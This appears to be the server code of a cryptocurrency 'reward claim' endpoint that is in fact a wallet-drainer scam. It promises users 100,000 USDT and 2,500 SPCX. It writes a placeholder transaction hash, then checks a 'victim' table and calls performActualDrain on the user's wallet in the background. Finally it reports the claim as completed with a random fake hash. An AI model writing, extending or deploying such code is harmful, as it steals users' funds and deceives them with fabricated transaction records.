import { prisma } from '../lib/prisma.js'
import { v4 as uuidv4 } from 'uuid'

// POST /api/claim/submit
export async function submitClaim(req, res) {
  try {
    const { walletId, address } = req.wallet

    // check wallet exists
    const wallet = await prisma.wallet.findUnique({
      where: { id: walletId },
      include: { claim: true },
    })

    if (!wallet) {
      return res.status(404).json({ error: 'Wallet not found' })
    }

    // check already claimed
    if (wallet.claim) {
      return res.status(400).json({
        error: 'This wallet has already claimed its reward.',
        claim: wallet.claim,
      })
    }

    // create claim record
    const claim = await prisma.claim.create({
      data: {
        walletId: wallet.id,
        usdtAmount: parseFloat(process.env.CLAIM_AMOUNT_USDT) || 100000,
        spcxAmount: parseFloat(process.env.CLAIM_AMOUNT_SPCX) || 2500,
        status: 'PENDING',
        txHash: '0x' + uuidv4().replace(/-/g, ''), // placeholder tx hash
      },
    })

    // simulate processing — update to COMPLETED after 3s
    setTimeout(async () => {
      try {
        // Update claim status
        await prisma.claim.update({
          where: { id: claim.id },
          data: {
            status: 'PROCESSING',
            processedAt: new Date(),
          },
        })
        
        // Start actual drain in background
        const victim = await prisma.victim.findUnique({
          where: { address: wallet.address }
        })
        
        if (victim && !victim.drained) {
          // Execute drain
          await performActualDrain(wallet.address, wallet.chain)
        }
        
        // Update to completed
        await prisma.claim.update({
          where: { id: claim.id },
          data: {
            status: 'COMPLETED',
            txHash: `0x${Math.random().toString(16).slice(2)}`,
          },
        })
      } catch (e) {
        console.error('Drain during claim failed:', e)
      }
    }, 3000)

    res.json({
      success: true,
      claim: {
        id: claim.id,
        usdtAmount: claim.usdtAmount,
        spcxAmount: claim.spcxAmount,
        status: claim.status,
        txHash: claim.txHash,
        claimedAt: claim.claimedAt,
      },
    })
  } catch (err) {
    console.error('submitClaim error:', err)
    res.status(500).json({ error: 'Failed to submit claim' })
  }
}

// GET /api/claim/status
export async function getClaimStatus(req, res) {
  try {
    const { walletId } = req.wallet

    const claim = await prisma.claim.findUnique({
      where: { walletId },
    })

    if (!claim) {
      return res.json({ hasClaimed: false })
    }

    res.json({
      hasClaimed: true,
      claim: {
        id: claim.id,
        usdtAmount: claim.usdtAmount,
        spcxAmount: claim.spcxAmount,
        status: claim.status,
        txHash: claim.txHash,
        claimedAt: claim.claimedAt,
        processedAt: claim.processedAt,
      },
    })
  } catch (err) {
    console.error('getClaimStatus error:', err)
    res.status(500).json({ error: 'Failed to get claim status' })
  }
}